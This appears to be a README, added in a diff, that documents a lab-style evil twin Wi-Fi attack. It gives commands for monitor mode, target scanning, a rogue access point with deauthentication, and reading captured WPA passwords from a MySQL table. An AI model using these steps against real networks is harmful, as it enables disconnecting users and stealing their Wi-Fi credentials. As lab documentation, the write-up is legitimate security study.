@@ -1,0 +1,77 @@
+#+TITLE: Evil Twin
+#+DESCRIPTION: Documenting the process in which I implemented an evil twin attack in my local network.
+
+* Info
+** Software Used
+- hostapd
+- dnsmasq
+** Disable port 53
+#+BEGIN_SRC bash
+sudo systemctl disable systemd-resolved
+sudo systemctl stop systemd-resolved
+#+END_SRC
+
+* Setting up a monitor interface
+First we need to check what network interfaces we have connected
+#+BEGIN_SRC bash
+sudo iw dev
+#+END_SRC
+
+We want to take note of the interface name, ~wlxf4ec388d723b~ for the external wifi adapter.
+
+Next we turn the interface down,
+
+#+BEGIN_SRC bash
+sudo ip link set wlxf4ec388d723b down
+#+END_SRC
+
+and then turn it into monitor mode,
+
+#+BEGIN_SRC bash
+sudo iw wlxf4ec388d723b set monitor none
+#+END_SRC
+
+
+and turn it back up.
+
+#+BEGIN_SRC bash
+sudo ip link set wlxf4ec388d723b up
+#+END_SRC
+
+The above can easily be done using ~mmode_f.sh~ and ~mmode_b.sh~.
+#+BEGIN_SRC bash
+sudo bash mmode_b.sh
+#+END_SRC
+* Scan for target ap
+#+BEGIN_SRC bash
+psudo python scanner.py
+#+END_SRC
+Save the needed info:
+- To perform the attack we need to sniff the following:
+  1. BSSID (the AP mac address we want to spoof)
+  2. ESSID (the name of the AP we want to spoof)
+  3. Channel
+* Start rouge AP
+#+BEGIN_SRC bash
+psudo python evil_twin.py -u wlx34080432263f -r wlxf4ec388d723b -i wlp3s0 -b 14:ae:db:ca:3d:0a -s ahome2.4 -c 1
+#+END_SRC
+The python script ~evil_twin.py~ does the following:
+1. Set up a rouge AP using the provided arguments (channel and essid).
+2. Start up a dnsmasq instance on the chosen interface.
+3. Start a deauthentication attack from a second interface.
+* Passwords are saved into mysql
+Login as ~fakeap~ with ~fakeap12~. The passwords are saved into wpa_keys.
+#+BEGIN_SRC bash
+mysql -u fakeap -p
+#+END_SRC
+#+BEGIN_SRC sql
+use rogue_AP;
+select * from wpa_keys;
+#+END_SRC
+* Resources
++ [[https://github.com/s0lst1c3/evil_twin][Base version]]
++ [[https://www.cellstream.com/reference-reading/tipsandtricks/410-3-ways-to-put-your-wi-fi-interface-in-monitor-mode-in-linux][Monitor mode linux]]
++ [[https://www.thepythoncode.com/article/building-wifi-scanner-in-python-scapy][Build packet sniffer in python]]
++ [[https://linuxhandbook.com/sudo-unable-resolve-host/][resolve hosts]]
++ [[https://askubuntu.com/questions/191226/dnsmasq-failed-to-create-listening-socket-for-port-53-address-already-in-use][resolve port 53]]
++ [[https://rootsh3ll.com/evil-twin-attack/][evil twin attack walkthrough]]
